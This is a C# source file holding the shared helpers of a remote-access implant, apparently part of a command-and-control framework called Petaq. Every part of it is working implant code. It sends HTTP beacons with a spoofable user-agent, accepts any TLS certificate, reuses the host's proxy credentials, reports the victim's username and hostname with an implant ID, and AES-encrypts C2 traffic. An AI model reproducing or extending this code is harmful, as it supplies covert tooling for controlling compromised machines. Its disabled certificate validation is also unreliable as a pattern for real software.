using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Xml.Serialization;
using System.IO;
using System.Net;
using System.Linq;
using System.Collections;
using System.Collections.Concurrent;

namespace PetaqImplant
{
    public static class Common
    {
        public static byte[] key = new byte[16];
        public static byte[] iv = new byte[16];

        public static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        // Generate random strings as websocket identifiers
        public static Random random = new Random();
        public static string RandomStringGenerator(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static HttpWebRequest GetWebRequest(string url)
        {
            // create a URI for the URL given
            Uri uri = new Uri(url);
            // create the HTTP request
            HttpWebRequest client = WebRequest.Create(uri) as HttpWebRequest;

            // use GET to normalise the traffic
            client.Method = WebRequestMethods.Http.Get;

            // get the default proxy if there is
            client.Proxy = new System.Net.WebProxy();
            // get the credentials for the proxy if there is
            client.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
            // ignore the certificate issues if necessary
            client.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

            // Create a cookie container 
            //CookieContainer cookies = new CookieContainer();
            // Add the session ID to the cookie
            //cookies.Add(new Cookie("SESSIONID", "123456789") { Domain = uri.Host });
            // Assign the cookies to the request
            //client.CookieContainer = cookies;

            // Set a User-Agent for it
            client.Headers.Add("user-agent", Program.configuration["UA"]);

            // Don't follow the redirects
            client.AllowAutoRedirect = false;

            // Return the client
            return client;
        }

        public static WebClient GetWebClient()
        {
            WebClient client = new WebClient();

            // set the User-Agent in the configuration
            client.Headers.Add("user-agent", Program.configuration["UA"]);

            // get the default proxy if there is
            client.Proxy = new System.Net.WebProxy();
            // get the credentials for the proxy if there is
            client.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
            return client;
        }

        public static string GetInfo()
        {
            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string implantInfo = "{'implantID':'";
            implantInfo += Program.configuration["ID"];
            implantInfo += "', 'userName':'" + Regex.Replace(Regex.Escape(username),"\\ ","\\");
            implantInfo += "', 'hostName':'" + Dns.GetHostName();
            implantInfo += "'}";

            //Console.Error.WriteLine(implantInfo);
            return implantInfo;
        }

        public static string GetLinkedImplantsJSON()
        {
            string linkedimplantinfo = "{";
            foreach (var li in Program.LinkedImplants)
            {
                if (li.Value.implantObject.Status)
                {
                    linkedimplantinfo += "'" + li.Key + "': {";
                    linkedimplantinfo += "'status':'" + li.Value.implantObject.Status;
                    linkedimplantinfo += "', 'link_uri':'" + li.Value.link_uri;
                    linkedimplantinfo += "', 'implantIP':'" + li.Value.implantObject.ServerAddress;
                    linkedimplantinfo += "', 'dateConnected':'" + li.Value.dateConnected;
                    linkedimplantinfo += "', 'dateDisconnected':'" + li.Value.dateDisconnected;
                    linkedimplantinfo += "'},";
                }
            }
            linkedimplantinfo += "}";

            Console.Error.WriteLine(linkedimplantinfo);
            return linkedimplantinfo;
        }

        public static string Encrypt(string text)
        {
            Array.Copy(Encoding.UTF8.GetBytes(Program.configuration["SESSION_KEY"]), key, 16);
            Array.Copy(Encoding.UTF8.GetBytes(Program.configuration["SESSION_IV"]), iv, 16);

            SymmetricAlgorithm algorithm = Aes.Create();
            ICryptoTransform transform = algorithm.CreateEncryptor(key, iv);
            byte[] inputbuffer = Encoding.UTF8.GetBytes(text);
            byte[] outputBuffer = transform.TransformFinalBlock(inputbuffer, 0, inputbuffer.Length);
            return Convert.ToBase64String(outputBuffer);
        }

        public static string Decrypt(string text)
        {
            Array.Copy(Encoding.UTF8.GetBytes(Program.configuration["SESSION_KEY"]), key, 16);
            Array.Copy(Encoding.UTF8.GetBytes(Program.configuration["SESSION_IV"]), iv, 16);

            SymmetricAlgorithm algorithm = Aes.Create();
            ICryptoTransform transform = algorithm.CreateDecryptor(key, iv);
            byte[] inputbuffer = Convert.FromBase64String(text);
            byte[] outputBuffer = transform.TransformFinalBlock(inputbuffer, 0, inputbuffer.Length);
            return Encoding.UTF8.GetString(outputBuffer);
        }
    }
}
